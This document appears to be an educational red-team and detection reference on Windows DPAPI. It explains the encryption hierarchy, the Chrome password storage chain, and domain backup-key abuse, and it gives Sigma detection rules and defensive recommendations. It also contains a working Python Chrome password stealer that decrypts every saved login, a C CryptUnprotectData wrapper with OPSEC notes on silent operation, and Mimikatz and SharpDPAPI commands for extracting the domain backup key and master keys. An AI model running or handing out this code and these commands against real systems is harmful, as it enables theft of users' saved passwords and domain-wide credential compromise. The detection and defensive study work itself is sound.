# DPAPI Decryption - Educational Analysis

> **MITRE ATT&CK**: T1555.004 - Credentials from Password Stores: Windows Credential Manager / T1555.003 - Credentials from Web Browsers
> **Purpose**: Understanding DPAPI architecture and credential decryption for detection engineering
> **Languages**: C, Python
> **Detection Focus**: Access to Protect directory, CryptUnprotectData usage, browser credential file access

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

The Data Protection API (DPAPI) is the standard Windows mechanism for protecting user secrets -- saved passwords, browser credentials, Wi-Fi keys, certificate private keys, and more. Because DPAPI ties encryption to user identity, compromising a user's password or session implicitly grants access to every DPAPI-protected secret on that system. Understanding the full decryption chain is essential for:

- **Detection Engineering**: Building alerts for unauthorized access to Master Key files and browser credential stores
- **Incident Response**: Determining what secrets an attacker could have accessed post-compromise
- **Security Architecture**: Evaluating whether DPAPI alone is sufficient protection for sensitive data
- **Red Team Operations**: Knowing when DPAPI decryption is feasible vs. when Credential Guard blocks it

## Technical Deep-Dive

### DPAPI Architecture

```
+-----------------------------------------------------------------------+
|                      DPAPI Encryption Hierarchy                       |
+-----------------------------------------------------------------------+
|                                                                       |
|  User Password (or domain backup key)                                 |
|       |                                                               |
|       v                                                               |
|  PBKDF2(SHA1/SHA512, password_hash + SID, iteration_count)           |
|       |                                                               |
|       v                                                               |
|  +---------------------+                                             |
|  |   Master Key        |   Stored at:                                |
|  |   (64 bytes)        |   %APPDATA%\Microsoft\Protect\{SID}\{GUID} |
|  +---------------------+   Each user has multiple master keys;       |
|       |                     one is "preferred" (most recent).         |
|       v                                                               |
|  Derived Key (from master key + HMAC context)                        |
|       |                                                               |
|       v                                                               |
|  +---------------------+                                             |
|  |   DPAPI Blob        |   Contains:                                |
|  |   (encrypted data)  |   - Version, Provider GUID                 |
|  |                     |   - Master Key GUID (which key to use)     |
|  |                     |   - Cipher algorithm (3DES / AES-256)      |
|  |                     |   - HMAC for integrity                     |
|  |                     |   - Encrypted payload                      |
|  +---------------------+                                             |
|                                                                       |
|  Domain DPAPI:                                                        |
|  - Domain controllers hold a backup key that can decrypt ANY          |
|    domain user's master keys without knowing their password.          |
|  - Stored as an LSA secret on the DC.                                 |
|  - Mimikatz: lsadump::backupkeys retrieves this key.                  |
|                                                                       |
+-----------------------------------------------------------------------+
```

### DPAPI Blob Structure

```
+------------------------------------------------------------------+
|  DPAPI Blob Binary Layout                                        |
+------------------------------------------------------------------+
| Offset | Size    | Field                                        |
|--------|---------|----------------------------------------------|
| 0x0000 | 4 bytes | dwVersion (0x01 = Win2K+)                    |
| 0x0004 | 16 bytes| guidProvider (df9d8cd0-1501-11d1-...)        |
| 0x0014 | 4 bytes | dwMasterKeyVersion                           |
| 0x0018 | 16 bytes| guidMasterKey (identifies which MK to use)   |
| 0x0028 | 4 bytes | dwFlags                                      |
| 0x002C | 4 bytes | dwDescriptionLen                             |
| 0x0030 | var     | szDescription (Unicode, optional)             |
| var    | 4 bytes | algCrypt (0x6603=3DES, 0x6610=AES-256)       |
| var    | 4 bytes | dwAlgCryptLen (key length in bits)            |
| var    | 4 bytes | dwSaltLen                                    |
| var    | var     | pbSalt                                       |
| var    | 4 bytes | dwStrongLen (HMAC key derivation iterations)  |
| var    | 4 bytes | algHash (0x8004=SHA1, 0x800E=SHA512)         |
| var    | 4 bytes | dwAlgHashLen                                 |
| var    | 4 bytes | dwHmacLen                                    |
| var    | var     | pbHmac (integrity check)                     |
| var    | 4 bytes | dwDataLen                                    |
| var    | var     | pbData (encrypted payload)                   |
| var    | 4 bytes | dwSignLen                                    |
| var    | var     | pbSign (signature)                           |
+------------------------------------------------------------------+
```

### Chrome/Edge Credential Decryption Chain

```
Step 1: Read AES key from browser Local State
==============================================
File: %LOCALAPPDATA%\Google\Chrome\User Data\Local State
Content: JSON file containing "os_crypt" -> "encrypted_key"
The encrypted_key is base64-encoded, prefixed with "DPAPI" (5 bytes).
Strip the prefix, then CryptUnprotectData decrypts it to a 256-bit AES-GCM key.

Step 2: CryptUnprotectData on the AES key
==========================================
This call succeeds only in the context of the user who encrypted it,
OR with the user's master key material (offline attack).
Returns raw 32-byte AES-256 key.

Step 3: Read Login Data SQLite database
========================================
File: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
Table: logins
Columns: origin_url, username_value, password_value
The password_value column contains AES-GCM encrypted data.

Step 4: AES-GCM decryption
============================
password_value format:
  Bytes 0-2:   "v10" or "v11" version prefix
  Bytes 3-14:  12-byte nonce (IV)
  Bytes 15-N:  ciphertext + 16-byte GCM authentication tag
Decrypt using AES-256-GCM with the key from Step 2.
```

### C Implementation: CryptUnprotectData

```c
/*
 * Educational: DPAPI decryption via CryptUnprotectData.
 *
 * This demonstrates the Windows API call that decrypts DPAPI blobs.
 * CryptUnprotectData is the legitimate API -- the same one Chrome,
 * Edge, and Windows Credential Manager use internally.
 *
 * DETECTION: Any process calling CryptUnprotectData is normal.
 * The suspicious pattern is a NON-BROWSER process reading
 * Chrome's Local State or Login Data files.
 *
 * OPSEC NOTE: CryptUnprotectData succeeds only if called by the
 * same user who encrypted the data (or SYSTEM with the user's
 * master key loaded). Running as a different user will fail
 * unless you supply the master key material manually.
 *
 * BUILD: cl.exe /nologo /W3 dpapi_demo.c /link crypt32.lib
 */
#include <windows.h>
#include <dpapi.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")

/*
 * Decrypt a DPAPI-protected blob.
 *
 * Parameters:
 *   pbEncrypted   - The raw DPAPI blob bytes
 *   cbEncrypted   - Length of the blob
 *   ppbDecrypted  - Receives pointer to decrypted data (caller frees with LocalFree)
 *   pcbDecrypted  - Receives length of decrypted data
 *
 * Returns TRUE on success, FALSE on failure.
 *
 * DETECTION NOTES:
 * ---------------------------------------------------------------
 * 1. CryptUnprotectData itself is NOT suspicious -- every browser
 *    and many Windows components call it routinely.
 * 2. What IS suspicious: a PowerShell, Python, or unknown process
 *    calling it after reading Chrome's encrypted_key.
 * 3. Monitor file access to Local State and Login Data from
 *    non-browser processes (Sysmon Event 11 / file access audit).
 * 4. EDR products hook CryptUnprotectData and log the caller.
 * ---------------------------------------------------------------
 */
BOOL dpapi_decrypt_blob(
    const BYTE *pbEncrypted, DWORD cbEncrypted,
    BYTE **ppbDecrypted, DWORD *pcbDecrypted)
{
    DATA_BLOB dbIn, dbOut;

    /* Set up the input blob structure */
    dbIn.pbData = (BYTE *)pbEncrypted;
    dbIn.cbData = cbEncrypted;

    /* Zero the output blob */
    dbOut.pbData = NULL;
    dbOut.cbData = 0;

    /*
     * CryptUnprotectData:
     *   - pDataIn:           Encrypted DPAPI blob
     *   - ppszDataDescr:     Optional description string (can be NULL)
     *   - pOptionalEntropy:  Additional entropy (NULL if none was used)
     *   - pvReserved:        Must be NULL
     *   - pPromptStruct:     Optional UI prompt (NULL for silent)
     *   - dwFlags:           0 for default, CRYPTPROTECT_UI_FORBIDDEN to suppress UI
     *   - pDataOut:          Receives decrypted data
     *
     * OPSEC: The CRYPTPROTECT_UI_FORBIDDEN flag prevents a UI prompt
     * if the blob was protected with CRYPTPROTECT_PROMPT_ON_UNPROTECT.
     * Using this flag is quieter but may fail on prompt-protected blobs.
     */
    if (!CryptUnprotectData(
            &dbIn,             /* Encrypted blob */
            NULL,              /* Description out (not needed) */
            NULL,              /* No additional entropy */
            NULL,              /* Reserved */
            NULL,              /* No prompt */
            CRYPTPROTECT_UI_FORBIDDEN,  /* Silent operation */
            &dbOut))           /* Decrypted output */
    {
        /*
         * Common failure reasons:
         * ERROR_INVALID_DATA     - Corrupted or non-DPAPI blob
         * ERROR_DECRYPTION_FAILED - Wrong user context / master key
         * NTE_BAD_KEY_STATE      - Master key not available
         */
        printf("[!] CryptUnprotectData failed: 0x%08lX\n", GetLastError());
        return FALSE;
    }

    *ppbDecrypted = dbOut.pbData;
    *pcbDecrypted = dbOut.cbData;
    return TRUE;
}

/*
 * Educational: Read and decrypt Chrome's encrypted AES key.
 *
 * This shows the decryption chain for browser credentials.
 * The same approach works for Edge, Brave, and other
 * Chromium-based browsers (different file paths).
 *
 * DETECTION:
 * - File read on "Local State" by non-browser process
 * - Base64 decode + CryptUnprotectData call sequence
 * - Subsequent SQLite open on "Login Data"
 */
void demonstrate_chrome_key_flow(void) {
    printf("=== Chrome Credential Decryption Chain ===\n\n");

    printf("Step 1: Read encrypted_key from Local State\n");
    printf("  Path: %%LOCALAPPDATA%%\\Google\\Chrome\\User Data\\Local State\n");
    printf("  Parse JSON -> os_crypt.encrypted_key\n");
    printf("  Base64 decode -> raw bytes\n");
    printf("  Strip 'DPAPI' prefix (first 5 bytes)\n\n");

    printf("Step 2: CryptUnprotectData on stripped bytes\n");
    printf("  Returns 32-byte AES-256-GCM key\n");
    printf("  Only succeeds in correct user context\n\n");

    printf("Step 3: Read Login Data SQLite database\n");
    printf("  Path: ...\\User Data\\Default\\Login Data\n");
    printf("  Query: SELECT origin_url, username_value, password_value\n");
    printf("         FROM logins\n\n");

    printf("Step 4: For each password_value:\n");
    printf("  Skip 3-byte version prefix ('v10' or 'v11')\n");
    printf("  Extract 12-byte nonce (bytes 3-14)\n");
    printf("  Extract ciphertext (bytes 15 to len-16)\n");
    printf("  Extract 16-byte GCM tag (last 16 bytes)\n");
    printf("  AES-256-GCM decrypt with key from Step 2\n");
}

int main(void) {
    demonstrate_chrome_key_flow();

    /* Example: Decrypt a DPAPI blob (would need real blob data) */
    printf("\n=== DPAPI Blob Decryption Demo ===\n");
    printf("Requires actual DPAPI-encrypted data and correct user context.\n");

    return 0;
}
```

### Python Implementation: Chrome Password Decryption

```python
"""
Educational: Chrome credential decryption chain in Python.

This demonstrates the full flow of extracting and decrypting
Chrome saved passwords on Windows. The same logic applies to
Edge, Brave, Opera, and other Chromium browsers.

DETECTION NOTES:
-----------------------------------------------------------------
1. Python.exe (or any non-browser process) opening:
   - "Local State" file (contains encrypted AES key)
   - "Login Data" file (SQLite DB with encrypted passwords)
   These file access events are HIGH-FIDELITY indicators.

2. CryptUnprotectData called via ctypes/win32crypt from Python
   is unusual and should be flagged by EDR.

3. Copying "Login Data" to a temp location (to bypass SQLite
   lock) creates a file-copy event.

4. Network exfiltration of decrypted credentials would appear
   as outbound data from a Python process.
-----------------------------------------------------------------

OPSEC CONSIDERATIONS FOR RED TEAMS:
- Chrome locks "Login Data" while running; you must copy it first.
  Copying to %TEMP% creates a forensic artifact.
- CryptUnprotectData only works in the target user's session.
  If running as SYSTEM, you need to impersonate the user first.
- Some EDRs specifically monitor for non-browser processes
  reading Chrome's credential files.
- Consider whether the operation justifies the detection risk.

REQUIRES: pip install pycryptodome pywin32
"""
import os
import json
import base64
import shutil
import sqlite3
import tempfile

# win32crypt provides the CryptUnprotectData wrapper
# DETECTION: Importing win32crypt in a script is a signal
# that DPAPI operations are being performed.
try:
    import win32crypt
except ImportError:
    print("[!] pywin32 not installed (pip install pywin32)")
    win32crypt = None

# Cryptodome provides AES-GCM decryption
# DETECTION: AES-GCM usage after DPAPI decryption is the
# signature pattern of Chrome credential theft.
try:
    from Crypto.Cipher import AES
except ImportError:
    print("[!] pycryptodome not installed (pip install pycryptodome)")
    AES = None


def get_chrome_local_state_path() -> str:
    """
    Locate Chrome's Local State file.

    DETECTION: Any process stat/open on this path that is not
    chrome.exe, update.exe, or a Google-signed binary is suspicious.
    """
    local_app_data = os.environ.get("LOCALAPPDATA", "")
    return os.path.join(
        local_app_data,
        "Google", "Chrome", "User Data", "Local State"
    )


def get_chrome_login_data_path() -> str:
    """
    Locate Chrome's Login Data SQLite database.

    DETECTION: Non-browser access to this file is a strong
    indicator of credential theft. Monitor with Sysmon Event 11
    (FileCreate) when the file is copied, or file access auditing.
    """
    local_app_data = os.environ.get("LOCALAPPDATA", "")
    return os.path.join(
        local_app_data,
        "Google", "Chrome", "User Data", "Default", "Login Data"
    )


def extract_dpapi_encrypted_key(local_state_path: str) -> bytes:
    """
    Extract and partially decrypt the AES key from Local State.

    The encrypted_key value is:
      base64( "DPAPI" + CryptProtectData(aes_key) )

    We base64-decode it, strip the "DPAPI" prefix, and return
    the raw DPAPI blob that still needs CryptUnprotectData.

    DETECTION: Reading and parsing Local State JSON from a
    non-browser process is anomalous.
    """
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    # Navigate JSON: os_crypt -> encrypted_key
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key_raw = base64.b64decode(encrypted_key_b64)

    # First 5 bytes are the ASCII string "DPAPI"
    # The remainder is the actual DPAPI blob
    assert encrypted_key_raw[:5] == b"DPAPI", "Expected DPAPI prefix"
    dpapi_blob = encrypted_key_raw[5:]

    return dpapi_blob


def dpapi_decrypt(dpapi_blob: bytes) -> bytes:
    """
    Decrypt a DPAPI blob using CryptUnprotectData.

    This will only succeed if:
    - Running in the context of the user who encrypted the data
    - The user's DPAPI master key is available in memory/on disk

    DETECTION:
    - win32crypt.CryptUnprotectData call from Python
    - EDR hooks on CryptUnprotectData see the calling process
    - Event 4693: "DPAPI was called" (if audit policy enabled)

    OPSEC: If running as SYSTEM, you must first impersonate the
    target user's token for CryptUnprotectData to succeed.
    """
    if win32crypt is None:
        raise RuntimeError("pywin32 required for DPAPI decryption")

    # CryptUnprotectData returns (description, decrypted_bytes)
    _, decrypted = win32crypt.CryptUnprotectData(
        dpapi_blob,  # Encrypted blob
        None,        # Optional entropy (Chrome uses None)
        None,        # Reserved
        None,        # Prompt struct
        0            # Flags (0 = default)
    )
    return decrypted


def decrypt_chrome_password(encrypted_value: bytes, aes_key: bytes) -> str:
    """
    Decrypt a single Chrome password_value using AES-256-GCM.

    Chrome password_value format (v80+):
      Bytes  0-2:  Version prefix ("v10" or "v11")
      Bytes  3-14: 12-byte nonce / initialization vector
      Bytes 15-N:  Ciphertext with 16-byte GCM auth tag appended

    DETECTION: AES-GCM decryption after reading Login Data is
    the definitive pattern. No legitimate non-browser process
    performs this sequence.
    """
    if AES is None:
        raise RuntimeError("pycryptodome required for AES-GCM")

    # Check for the version prefix
    version_prefix = encrypted_value[:3]
    if version_prefix not in (b"v10", b"v11"):
        # Older Chrome versions used DPAPI directly (no AES-GCM)
        # Fall back to CryptUnprotectData
        return dpapi_decrypt(encrypted_value).decode("utf-8", errors="replace")

    # Extract components from the encrypted value
    nonce = encrypted_value[3:15]           # 12-byte IV
    ciphertext_with_tag = encrypted_value[15:]
    ciphertext = ciphertext_with_tag[:-16]  # Everything except last 16 bytes
    auth_tag = ciphertext_with_tag[-16:]    # Last 16 bytes = GCM tag

    # Decrypt with AES-256-GCM
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, auth_tag)

    return plaintext.decode("utf-8", errors="replace")


def demonstrate_chrome_decryption():
    """
    Full demonstration of Chrome password extraction.

    OPSEC WARNING:
    - This copies Login Data to temp (creates forensic artifact)
    - CryptUnprotectData is called (may trigger EDR)
    - Reading Login Data from non-Chrome process is flagged
    - All of these steps leave traces in Sysmon/ETW logs

    DEFENSIVE VALUE:
    - Understanding this chain helps build precise detection rules
    - Each step has a detectable artifact
    - File integrity monitoring on Chrome profile catches step 1
    """
    print("=== Chrome Credential Decryption (Educational) ===\n")

    # Step 1: Get the AES key
    local_state_path = get_chrome_local_state_path()
    print(f"[*] Local State path: {local_state_path}")

    if not os.path.exists(local_state_path):
        print("[!] Chrome Local State not found (Chrome not installed?)")
        return

    dpapi_blob = extract_dpapi_encrypted_key(local_state_path)
    print(f"[*] Extracted DPAPI blob: {len(dpapi_blob)} bytes")

    # Step 2: DPAPI decrypt to get AES key
    # DETECTION: CryptUnprotectData from Python.exe
    aes_key = dpapi_decrypt(dpapi_blob)
    print(f"[*] Decrypted AES-256 key: {len(aes_key)} bytes")

    # Step 3: Copy Login Data (Chrome locks the file while running)
    # DETECTION: File copy of Login Data to temp directory
    login_data_path = get_chrome_login_data_path()
    temp_db = os.path.join(tempfile.gettempdir(), "LoginData_copy.db")
    shutil.copy2(login_data_path, temp_db)
    print(f"[*] Copied Login Data to: {temp_db}")

    # Step 4: Query and decrypt
    # DETECTION: SQLite operations on a copy of Login Data
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT origin_url, username_value, password_value FROM logins"
    )

    for url, username, encrypted_password in cursor.fetchall():
        if encrypted_password:
            try:
                password = decrypt_chrome_password(encrypted_password, aes_key)
                print(f"  URL: {url}")
                print(f"  User: {username}")
                print(f"  Pass: {'*' * len(password)} ({len(password)} chars)")
                print()
            except Exception as e:
                print(f"  [!] Decryption failed for {url}: {e}")

    conn.close()

    # Cleanup: Remove the temp copy
    # OPSEC: Failing to clean up leaves a forensic artifact
    os.remove(temp_db)
    print("[*] Cleaned up temp database copy")


# Entry point -- for educational analysis only
if __name__ == "__main__":
    demonstrate_chrome_decryption()
```

### Domain DPAPI: Backup Key Abuse

```
Domain DPAPI Attack Flow (SharpDPAPI / Mimikatz dpapi module):
==============================================================

1. Domain Controller stores a DPAPI backup key as an LSA secret.
   This key can decrypt ANY domain user's master keys.

   Mimikatz:  lsadump::backupkeys /system:dc01.corp.local /export
   SharpDPAPI: backupkey /nowrap

   DETECTION: DCE/RPC call to MS-BKRP (BackupKey Remote Protocol)
   on the DC. Event 4662 on the BCKUPKEY object in AD.

2. With the backup key, decrypt any user's master keys:
   - Master keys: %APPDATA%\Microsoft\Protect\{SID}\{GUID}
   - Mimikatz:  dpapi::masterkey /in:{GUID} /pvk:backup.pvk
   - SharpDPAPI: masterkeys /pvk:backup.pvk

   DETECTION: Remote file access to \Protect\ directories
   across multiple users is highly anomalous.

3. With decrypted master keys, decrypt any DPAPI blob:
   - Browser passwords, saved credentials, certificates, etc.
   - Mimikatz:  dpapi::chrome /in:"Login Data" /masterkey:{hex}
   - SharpDPAPI: credentials /mkfile:masterkeys.txt

   DETECTION: Mass decryption across users is a domain-wide
   credential compromise indicator.

DEFENSIVE NOTES:
- Credential Guard protects DPAPI master keys from extraction
  when the user's session is protected by VBS.
- The domain backup key CANNOT be rotated easily. If it is
  compromised, the only mitigation is to reset all user passwords
  and re-encrypt all DPAPI-protected secrets.
- Monitor for MS-BKRP protocol usage to the DC.
```

## Detection Indicators

### High-Fidelity Detection Signals

| Detection Point | Source | Description |
|----------------|--------|-------------|
| Access to `\Protect\{SID}\` | Sysmon 11 / File Audit | Master key file reads by non-LSASS processes |
| CryptUnprotectData from unusual process | EDR / ETW | Python, PowerShell, or unknown EXE calling DPAPI |
| Chrome `Local State` read | File access audit | Non-browser process reading encrypted_key |
| Chrome `Login Data` read/copy | Sysmon 11 | File copy of Login Data to temp directory |
| Event 4693 | Security log | DPAPI activity audit (if enabled) |
| MS-BKRP to DC | Network / Event 4662 | Domain backup key retrieval |
| Mass master key access | File audit correlation | Single process touching multiple users' Protect dirs |

### Sigma Detection Rules

```yaml
# Detect non-browser process reading Chrome Local State
title: Chrome Credential Store Access by Non-Browser Process
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 11  # FileCreate (copy) or use file access audit
        TargetFilename|endswith: '\Google\Chrome\User Data\Local State'
    filter:
        Image|endswith:
            - '\chrome.exe'
            - '\Google\GoogleUpdate.exe'
    condition: selection and not filter
level: high

# Detect access to DPAPI Master Key directory
title: DPAPI Master Key Directory Access
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 11
        TargetFilename|contains: '\Microsoft\Protect\'
    filter:
        Image|endswith:
            - '\lsass.exe'
            - '\svchost.exe'
    condition: selection and not filter
level: critical
```

### Defensive Recommendations

1. **Credential Guard**: VBS-based isolation prevents DPAPI master key extraction from memory
2. **File access auditing**: Monitor access to `%APPDATA%\Microsoft\Protect\` directories
3. **Browser hardening**: Use enterprise password managers instead of browser-saved passwords
4. **ASR rules**: Block untrusted processes from accessing browser credential stores
5. **Domain backup key monitoring**: Alert on MS-BKRP protocol usage and Event 4662 on BCKUPKEY objects

## Cross-References

- [LSASS Dumping Theory](../../07-credential-access/lsass-dumping.md)
- [DPAPI Abuse](../../07-credential-access/dpapi-abuse.md)
- [Token Manipulation](token-manipulation.md)
- [MiniDump Implementation](minidump-implementation.md)
- [Windows Internals Reference](../../appendices/windows-internals-reference.md)

## References

- Microsoft: CryptUnprotectData Documentation
- Microsoft: DPAPI Technical Overview
- MITRE ATT&CK T1555.004 and T1555.003
- Benjamin Delpy: Mimikatz DPAPI Module Documentation
- GhostPack: SharpDPAPI
- harmj0y: Operational Guidance for Offensive DPAPI Usage
